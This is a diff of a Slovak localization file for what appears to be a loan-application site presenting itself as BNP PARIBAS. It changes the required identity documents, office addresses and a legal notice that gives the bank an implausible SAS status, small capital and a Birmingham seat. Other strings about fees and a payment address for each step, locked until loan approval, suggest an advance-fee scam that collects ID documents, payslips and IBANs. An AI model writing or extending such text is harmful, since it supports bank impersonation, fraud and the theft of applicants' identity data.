@@ -190,7 +190,7 @@
     "success": "Žiadosť odoslaná!",
     "requiredDocs": "Doklady potrebné na posúdenie",
     "requiredDocsHint": "Nahrajte čitateľné PDF, JPG alebo PNG súbory pre rýchlejšie schválenie.",
-    "doc1": "Platný doklad totožnosti (obe strany)",
+    "doc1": "Platný doklad totožnosti alebo vodičský preukaz (obe strany) — alebo cestovný pas (iba predná strana)",
     "doc2": "Aktuálne potvrdenie o adrese",
     "doc3": "Posledné tri výplatné pásky alebo potvrdenie o príjme",
     "doc4": "Posledný bankový výpis alebo IBAN na meno žiadateľa",
@@ -282,8 +282,8 @@
     "defaultEmailPlaceholder": "vy@priklad.sk",
     "back": "Späť",
     "phoneTitle": "Zákaznícka podpora",
-    "address": "16 boulevard des Italiens",
-    "addressCity": "75009 Paríž, Francúzsko",
+    "address": "103 avenue des Champs-Élysées",
+    "addressCity": "75008 Paríž, Francúzsko",
     "sending": "Odosielanie…",
     "successQueued": "Správa bola uložená. Ozveme sa čoskoro."
   },
@@ -442,7 +442,7 @@
     "sectionHelp": "Nastavte poplatky a platobnú adresu pre každý krok, overte potvrdenku a odošlite kód.",
     "gatedTitle": "Konfigurácia je uzamknutá",
     "gatedDesc": "Konfigurácia bude dostupná po schválení úveru.",
-    "address": "16 boulevard des Italiens",
+    "address": "Platobná adresa",
     "saved": "Konfigurácia uložená",
     "invalidFee": "Neplatný poplatok",
     "codeSent": "Kód vygenerovaný a odoslaný",
@@ -1057,7 +1057,7 @@
       "sections": [
         {
           "h": "Vydavateľ",
-          "p": "BNP PARIBAS — SAS, kapitál 1 000 000 EUR — sídlo: 16 boulevard des Italiens, 75009 Paris, France"
+          "p": "BNP PARIBAS — SAS, kapitál 1 000 000 EUR — sídlo: 1 Centenary Square, Birmingham, Spojené kráľovstvo."
         },
         {
           "h": "Riaditeľ",
